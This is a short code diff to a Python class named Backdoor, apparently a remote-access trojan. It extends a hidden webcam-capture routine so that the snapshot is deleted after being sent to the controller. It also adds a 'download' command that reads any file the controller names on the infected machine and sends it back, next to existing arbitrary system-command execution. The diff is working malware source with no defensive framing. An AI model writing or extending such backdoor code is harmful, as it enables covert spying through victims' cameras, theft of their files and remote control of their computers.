@@ -93,8 +93,16 @@ class Backdoor:
 					cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
 					result, image = cam.read()
 					cv2.imwrite("camera.jpg", image)
-					self.reliable_send(self.read_file("camera.jpg") )           
+					self.reliable_send(self.read_file("camera.jpg") )
+					os.remove("camera.jpg")       
 					cam.release()
+
+				elif command.split()[0] == "download":
+					file = command.replace("download", "").strip()
+					if os.path.exists(file):
+						self.reliable_send(self.read_file(file))
+					else: 
+						self.reliable_send("[-] Check your command")
 
 				else:
 					res = self.execute_system_command(command)
